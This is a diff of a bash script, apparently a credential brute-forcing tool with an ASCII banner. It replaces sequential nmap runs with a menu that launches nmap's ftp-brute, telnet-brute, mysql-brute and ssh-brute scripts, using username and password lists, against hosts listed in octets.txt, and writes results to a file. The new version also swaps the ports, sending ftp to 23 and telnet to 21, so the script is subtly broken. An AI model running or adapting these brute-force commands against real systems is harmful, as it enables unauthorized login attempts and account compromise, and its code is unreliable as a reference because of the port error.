@@ -1,6 +1,7 @@
 #!/usr/bin/bash
 
 
+
 echo "______            _             ______       _   ";
 echo "| ___ \          | |            | ___ \     | |  ";
 echo "| |_/ /_ __ _   _| |_ ___ ______| |_/ / ___ | |_ ";
@@ -20,34 +21,36 @@ do
 	done
 done
 
-wait
+PS3="Select protocol to bruteforce: "
 
-echo "______                _             ";
-echo "| ___ \              (_)            ";
-echo "| |_/ /_      ___ __  _ _ __   __ _ ";
-echo "|  __/\ \ /\ / / '_ \| | '_ \ / _\` |";
-echo "| |    \ V  V /| | | | | | | | (_| |";
-echo "\_|     \_/\_/ |_| |_|_|_| |_|\__, |";
-echo "                               __/ |";
-echo "                              |___/ ";
+select opt in ftp telnet mysql ssh quit
+do
 
+	case $opt in
 
-sudo nmap -p22 --script ssh-brute --script-args userdb=usernames.lst, passdb=passlist.lst -iL octets.txt | tee results.txt &
+		ftp)
+			sudo nmap --script ftp-brute -p23 -iL octets.txt --script-args userdb=usernames.txt,passdb=passlist.txt | tee results.txt
+			;;	
+		
+		telnet)
+			sudo nmap --script telnet-brute -p21 -iL octets.txt --script-args userdb=usernames.txt,passdb=passlist.txt | tee results.txt
+			;;
+		
+		mysql)
+			sudo nmap --script mysql-brute -p3306 -iL octets.txt --script-args userdb=usernames.txt,passdb=passlist.txt | tee results.txt
+			;;
 
-wait
+		ssh)
+sudo nmap --script ssh-brute -p22 -iL octets.txt --script-args userdb=usernames.txt,passdb=passlist.txt | tee results.txt
+			;;
 
-sudo nmap -p21 --script ftp-brute --script-args userdb=usernames.lst, passdb=passlist.lst -iL octets.txt | tee results.txt &
-
-wait
-
-sudo nmap -p3306 --script mysql-brute --script-args userdb=usernames.lst, passdb=passlist.lst -iL octets.txt | tee results.txt &
-
-wait
-
-sudo nmap -p23 --script telnet-brute --script-args userdb=usernames.lst, passdb=passlist.lst -iL octets.txt | tee results.txt &
-
-wait
-
+		quit)
+			break
+			;;
+		*)
+			echo "invalid option $REPLY"
+	esac
+done
 rm octets.txt
 exit
 
